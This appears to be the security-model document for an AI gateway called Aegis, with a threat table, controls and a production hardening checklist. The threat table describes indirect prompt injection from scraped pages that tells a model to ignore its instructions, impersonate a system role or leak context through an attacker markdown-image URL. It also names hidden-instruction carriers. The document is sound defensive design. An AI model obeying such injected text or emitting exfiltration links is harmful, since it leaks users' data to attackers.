# Security model

This document describes the threats Aegis is designed to mitigate, the
controls it implements, and what is intentionally out of scope.

## Threat model

| Threat | Mitigation |
| --- | --- |
| Employee pastes a customer SSN/PHI/credit card into an AI tool. | Inbound detector + severity-based action (`block` for HIPAA/PCI; `redact` otherwise). |
| Service account hard-codes an API key in a prompt. | Secret detectors (`aws_access_key`, `github_token`, `openai_key`, `slack_token`, `private_key_block`, `jwt`) flagged as high severity. |
| **Indirect prompt injection from a scraped webpage** — page tells the model to ignore instructions, exfiltrate context via `![](attacker/?leak=…)`, or impersonate a system role. | `aegis/policy/injection.py` runs on every request *and* every response; `<aegis:untrusted>` wrapping (or `X-Aegis-Untrusted: 1`) elevates all such findings to HIGH so they get blocked by `baseline`. Hidden Unicode tag chars and zero-width payloads are stripped before forwarding. |
| **Markdown-image data exfiltration in the model's reply** (renderer GETs the URL, leaking the prompt). | Outbound scan blocks/redacts `markdown_image_exfil` findings before the response reaches the client. |
| **Hidden instructions in HTML comments / `<script>` blocks / data URIs** in scraped pages. | Dedicated detectors for each. |
| **Runaway agent loop** runs up the user's bill. | `aegis/safety/loops.py` blocks identical-prompt repetition (default 8/120s) with explicit `X-Aegis-Override-Loop` to proceed (logged). |
| **Forgotten cost guardrail** on a customer's bot lets it spend $1000s. | `aegis/safety/budgets.py` enforces always-on per-key and per-tenant budgets on requests and **estimated USD**; over-limit requests return HTTP 429 with explicit override instructions. |
| AI provider returns content that includes leaked credentials. | Outbound re-scan + redaction before the response reaches the client. |
| Engineer routes around the gateway by calling OpenAI directly. | Egress firewall + DNS controls block direct provider IPs; only the gateway is allowed to reach them. (Aegis is the *only* identity holding the real upstream key.) |
| Insider exfiltrates data via prompt history. | All requests/responses produce append-only `AuditEvent` rows; SIEM ingest via JSON logs. |
| Aegis DB compromise. | API keys are bcrypt-hashed; only the public prefix is recoverable. Sessions are short-lived JWTs signed with `AEGIS_SECRET_KEY`. Provider credentials should be wrapped with DB-level encryption (KMS / pgcrypto) in production. |
| Replay of an Aegis API key. | Keys can be revoked instantly from the admin console; revocation propagates because authentication checks `revoked` on every request. |
| Compromised endpoint agent. | Agent has no upstream credentials — only an Aegis API key. Revoking the key disables it immediately. |
| Anomalous burst of blocks (compromised account). | `AnomalyTracker` exposes per-tenant block-rate via `/v1/policy/me`; alert on `block / total > threshold`. |

## Controls

### Authentication
- **Programmatic clients**: bearer tokens of the form `aeg_<env>_<prefix>.<secret>`.
  The secret half is bcrypt-hashed at rest. The prefix is stored in plaintext
  for identification only.
- **Admin console**: email + password + JWT session cookie (`HttpOnly`,
  `SameSite=Lax`, `Secure` in production).

### Authorization
- Multi-tenant: every business object carries `tenant_id`. Admin API queries
  always filter by the caller's tenant; the proxy never crosses tenant
  boundaries.
- User roles: `admin | security | member` (the admin UI requires
  `admin` or `security`).

### Data minimisation
- Compliance profiles can disable `store_request_excerpts`. When disabled,
  audit rows record sizes, decisions, findings (categories only — never raw
  values), but not the prompt/response text.
- Findings record only the masked excerpt (`ja*****oe`), never the original
  value, regardless of profile.

### Transport
- Run Aegis behind TLS in production. The gateway speaks HTTP internally and
  expects the load balancer / ingress to terminate TLS and set
  `X-Forwarded-Proto`.
- Set `AEGIS_SESSION_COOKIE_SECURE=true` once TLS is in place.

### Audit
- Append-only by application convention. For regulated environments,
  replicate `audit_events` to a WORM store (S3 Object Lock, AWS QLDB, immudb).
- JSON structured logs include `request_id`, `tenant_id`, and
  `policy_decision` to make SIEM correlation trivial.

## Out of scope (deliberately)

- **Endpoint hardening** — Aegis enforces what AI receives, not what runs on
  the laptop. Pair with EDR/MDM for full coverage.
- **Provider-side data residency** — Aegis cannot guarantee how OpenAI handles
  data. The right answer is to combine Aegis with private-deployment models
  (Azure OpenAI in your tenancy, on-prem vLLM) for regulated workloads. The
  `model_allow` policy makes that enforceable.
- **DLP for non-AI traffic** — Aegis is not a general-purpose DLP. It is the
  AI-specific control point.

## Hardening checklist for production

- [ ] Generate a real `AEGIS_SECRET_KEY` (`python -c "import secrets; print(secrets.token_urlsafe(48))"`).
- [ ] Move `AEGIS_DATABASE_URL` to managed Postgres with `sslmode=require`.
- [ ] Wrap `provider_credentials.api_key` with KMS-backed envelope encryption.
- [ ] Front the gateway with a TLS-terminating proxy (ALB / Caddy / Nginx).
- [ ] Set `AEGIS_SESSION_COOKIE_SECURE=true`, restrict `AEGIS_ALLOWED_HOSTS`.
- [ ] Egress firewall: only the Aegis gateway can reach `api.openai.com`,
      `api.anthropic.com`, etc.
- [ ] Ship JSON logs to your SIEM.
- [ ] Replicate `audit_events` to a WORM store.
- [ ] Rotate the bootstrap admin password; create per-person admin accounts;
      delete the bootstrap account.
- [ ] Enable SSO (planned — see `docs/roadmap.md`).
